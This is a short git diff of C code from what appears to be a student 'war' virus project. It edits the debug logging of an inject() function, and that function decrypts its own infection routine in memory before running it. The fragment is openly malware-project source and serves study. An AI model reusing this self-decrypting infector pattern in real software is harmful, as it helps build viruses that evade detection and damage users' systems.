@@ -6,22 +6,20 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/12 17:16:52 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/12 20:34:38 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "war.h"
 
 /*
-  Inject -> follow the step.
+  Inject -> follow the step!
 */
-
 void		inject(t_data *data)
 {
 #ifdef DEBUG
-	char de[] = "inject\t\t0\n";
-	data->context == true ?	de[8] = 49 : 0;
-	_log(de, _strlen(de));
+	char log[] = "inject\t\t";
+	_log(log, NULL, 8,data->context);
 #endif
 
 	revert_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
